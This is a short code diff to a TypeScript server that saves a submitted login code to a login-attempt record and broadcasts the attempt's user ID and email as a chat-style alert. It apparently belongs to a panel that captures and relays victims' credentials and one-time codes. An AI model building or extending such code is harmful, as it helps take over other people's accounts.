@@ -65,6 +65,13 @@ const server = serve({
             return json({ error: "Login attempt not found" }, 404);
           }
 
+          await db
+            .update(tables.loginAttempt)
+            .set({
+              code: basePayload.data.code,
+            })
+            .where(eq(tables.loginAttempt.id, loginAttempt.id));
+
           const messages = await sendMessageToAllSessions(
             `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
               `<b>🔒 EMAIL:</b> <code>${step3Payload.data.email}</code>\n` +
